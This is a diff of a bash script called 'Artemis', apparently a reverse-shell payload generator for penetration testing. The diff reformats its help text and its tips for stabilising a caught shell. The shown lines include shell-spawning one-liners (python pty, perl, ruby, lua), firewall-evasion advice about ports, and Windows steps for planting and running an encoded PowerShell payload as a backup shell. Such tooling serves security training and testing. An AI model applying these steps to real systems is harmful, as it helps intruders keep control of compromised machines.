@@ -5,19 +5,56 @@ line="\n============================================================\n"
 
 Help()
 {
-        echo -e "$line\nArtemis will run in interactive mode unless all arguments are supplied\nThese payloads are not intended to bypass Antivirus\n\n"
-	echo -e "This script supports the following arguments:\n\n-h: Display this help message\n\n"
-	echo -e "-a: Generate commands for Pivoting in Active Directory, instead of Reverse shell payloads. If used, all other arguments will be ignored\n\n"
-	echo -e "-i <IP_Address>: The IP Address to listen on\n\n-p <port>: The port to listen on (common port numbers are more likely to bypass your target's firewall!)\n\n"
-	echo -e "-l: Start a listener using specified interface and port (Don't use this option if you are starting a listener manually)\n\n"
-	echo -e "-t <Target_OS>: Specify the target OS for Web shell payloads & for stabilization tips [win/nix]\n\n"
-	echo -e "-s <Payload_Type>: Specify the type of Reverse shell to generate (Refer to the Payloads section for a list of accepted arguments)\n$line"
-	echo -e "[Example Syntax]\n\nReverse Shell: artemis -i 10.10.144.68 -p 443 -s php -t nix -l\n\nAD Pivoting: artemis -a\n$line"	
-	echo -e "Payloads:\n\n[ps] Powershell\n[bash]\n[nc] Netcat (*nix targets)\n[java]\n[py] Python (*nix targets)\n[php] (*nix targets)"
-	echo -e "[node] Node.js (*nix targets)\n\n"
-	echo -e "[!] Tip: If you're having trouble catching a shell, try the following steps-\n\n1) Double check your firewall settings & verify target's IP Address\n"
-	echo -e "2) Instead of getting a Reverse Shell, start capturing ICMP packets and use a payload to make the target ping you a few times\n"
-	echo -e "3) Use common ports for your Reverse shell (e.g. 80 or 443) or try ports that hosts in your target's LAN are using\n"
+cat << EOF
+Artemis will run in interactive mode unless all arguments are supplied. These payloads are not intended to bypass Antivirus
+	
+Options:
+
+	-h: Display this help message
+
+	-a: Generate commands for Pivoting in Active Directory, instead of Reverse shell payloads. If used, all other arguments will be ignored
+
+	-i <IP_Address>: The IP Address to listen on
+
+	-p <port>: The port to listen on (common port numbers are more likely to bypass your target's firewall!)
+
+	-l: Start a listener using specified interface and port (Don't use this option if you are starting a listener manually)
+
+	-t <Target_OS>: Specify the target OS for Web shell payloads & for stabilization tips [win/nix]
+
+	-s <Payload_Type>: Specify the type of Reverse shell to generate (Refer to the Payloads section for a list of accepted arguments)
+
+Example Syntax:
+
+	Reverse Shell: artemis -i 10.10.144.68 -p 443 -s php -t nix -l
+
+	AD Pivoting: artemis -a
+
+Payloads:
+
+	[ps] Powershell
+
+	[bash]
+
+	[nc] Netcat (*nix targets)
+
+	[java]
+
+	[py] Python (*nix targets)
+
+	[php] (*nix targets)
+
+	[node] Node.js (*nix targets)
+
+Troubleshooting: If you're having trouble catching a shell, try the following steps-
+
+1) Double check your firewall settings & verify target's IP Address
+
+2) Instead of getting a Reverse Shell, start capturing ICMP packets and use a payload to make the target ping you a few times
+
+3) Use common ports for your Reverse shell (e.g. 80 or 443) or try ports that hosts in your target's LAN are using
+
+EOF
 }
 
 PowerSHELL()
@@ -277,29 +314,65 @@ then
 
 elif [ "$target" == "nix" ]
 then
-	echo -e "\n\n{Manually Stabilizing a Linux Shell}\n"
-	echo -e "1) Identify SW on target:\n\nwhich python python2 python3 ruby perl lua\n"
-	echo -e "2) Example Commands:\n\npython3 -c 'import pty;pty.spawn(\"/bin/bash\")'\n"
-	echo -e "perl -e 'exec \"/bin/sh\";'\nruby -e 'exec \"/bin/sh\"'\nlua -e \"os.execute('/bin/sh')\"\n"
-	echo -e "3) Set Shell Type:\nexport SHELL=bash\n\n"
-	echo -e "4) Set Terminal Type:\nexport TERM=xterm-256color\n\n"
-#	echo -e "5) {Optional} Configure Attacker's Terminal:\nA) Background Reverse Shell:\nPress CTRL+Z\n\n"
-#	echo -e "B) Disable Attacker's Echo:\nstty raw -echo\n\nC) Get Size of Terminal Window:\nstty size\n(Changes if you resize Terminal!)\n\n"
-#	echo -e "D) Foreground Reverse Shell:\nfg\n(Press \"Enter\" a couple times)\n\n"
-#	echo -e "E) Set Reverse Shell Terminal Size:\nstty rows X columns Y\n(Replace X & Y with the numbers from Step C)\n\n"
-	echo -e "[!] Tip: You may be able to create SSH Keys on the target machine and use them for an upgraded shell\n$line" 
+	cat <<-EOF
+	{Manually Stabilizing a Linux Shell}
+
+	[!] Tip: You may be able to create SSH Keys on the target machine and use them for an upgraded shell
+
+	1) Identify SW on target:
+	  which python python2 python3 ruby perl lua
+
+	2) Example Commands:
+	  python3 -c 'import pty;pty.spawn("/bin/bash")'
+	  perl -e 'exec "/bin/sh";'
+	  ruby -e 'exec "/bin/sh"'
+	  lua -e "os.execute('/bin/sh')"
+
+	3) Set Shell Type:
+	  export SHELL=bash
+
+	4) Set Terminal Type:
+	  export TERM=xterm-256color
+EOF
+#	5) {Optional} Configure Attacker's Terminal:
+#	  A) Background Reverse Shell:
+#	    Press CTRL+Z
+#	  B) Disable Attacker's Echo:
+#	    stty raw -echo
+#	  C) Get Size of Terminal Window: This changes if you resize the terminal!
+#	    stty size
+#	  D) Foreground Reverse Shell: Press "Enter" a couple times afterwards
+#	    fg
+#	  E) Set Reverse Shell Terminal Size: Replace X & Y with the numbers from Step C
+#	    stty rows X columns Y
 
 elif [ "$target" == "win" ]
 then
-	echo -e "\n\n{Manually Stabilizing a Windows Shell}\n"
-	echo -e "Use this shell to create a \"Backup Shell\" that you'll use. It may be more stable, but it's mainly in case you cause the shell to freeze while using it.\n\nSetup:\n"
-	echo "1) Navigate to a Writable Directory:"; echo "cd \users\public"
-	echo -e "\n2) Create a file with your payload [May be bad advice. These may want an EXE, like the Process command]:\nWrite-Output \"PAYLOAD\" > shell.ps1\n\nMethods:\n"
-	echo "1) Process: (Try with and without \"-NoNewWindow\")"; echo "Start-Process -FilePath \"powershell\" -ArgumentList \"-enc ENCODED\""
-	echo -e "\n2) Job:"; echo "Start-Job .\shell.ps1"
-	echo -e "\n3) Run in foreground:\n"; echo "C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe \Users\Public\shell.ps1"
+	cat <<-EOF
+	{Manually Stabilizing a Windows Shell}
 
+	Use this shell to create a "Backup Shell" that you'll use. It may be more stable, but it's mainly in case you cause the shell to freeze while using it.
 
+	Setup:
+
+	  1) Navigate to a Writable Directory:
+	    cd \users\public
+
+	  2) Create a file with your payload [May be bad advice. These may want an EXE, like the Process command]:
+	    Write-Output "PAYLOAD" > shell.ps1
+
+	Methods:
+
+	  1) Process: (Try with and without "-NoNewWindow")
+	    Start-Process -FilePath "powershell" -ArgumentList "-enc ENCODED"
+
+	  2) Job:
+	    Start-Job .\shell.ps1
+
+	  3) Run in foreground:
+	    C:\Windows\sysnative\WindowsPowerShell\v1.0\powershell.exe \Users\Public\shell.ps1
+
+EOF
 else
 	echo -e "\nYou did not select a valid option\n"
 fi
